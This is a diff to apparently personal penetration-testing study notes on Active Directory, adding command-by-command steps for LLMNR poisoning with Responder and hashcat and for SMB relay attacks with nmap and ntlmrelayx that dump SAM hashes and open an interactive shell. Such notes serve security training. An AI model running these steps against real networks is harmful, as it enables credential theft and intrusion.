@@ -139,15 +139,40 @@
     * Password123 
     * Password1!
     
-  
-
-
-
 ## Attacking AD: Initial Attack Vectors
 ### LLMNR Poisoning
-
+  1. Run responder and get hashes
+  ```sh
+  responder -I ${interface} -dwv
+  ```
+  2. Copy the hash
+  3. Attempt to crack the hash with hashcat
+  ```powershell
+  .\hashcat -m 5600 .\ntlmhash.txt .\rockyou.txt -O
+  ```
 ### SMB Relay Attacks
-
+  1. Discover what hosts have SMB signing Disabled on either Nessus or Nmap.
+  ```sh
+  nmap --script=smb2-security-mode.nse -p445 #{network}
+  ```
+  2. Make a list of targets that have message signing enabled and not required or disabled.
+  3. Change Responder.conf and change two lines: SMB = Off and HTTP = Off
+  4. Start responder
+   ```sh
+  responder -I ${interface} -dwv
+  ```
+  4. Start ntlmrelayx and obtain SAM Hashes
+  ```sh
+  ntlmrelayx.py -tf targets.txt -smb2support
+  ```
+  5. Start ntlmrelayx and obtain an interactive shell
+  ```sh
+  ntlmrelayx.py -tf targets.txt -smb2support -i
+  ```
+  6. Connect to the shell
+  ```sh
+  nc 127.0.0.1 11000
+  ```
 
 ## Attacking AD: Post-Compromise Enumeration
 ### Domain Enumeration with Powerview
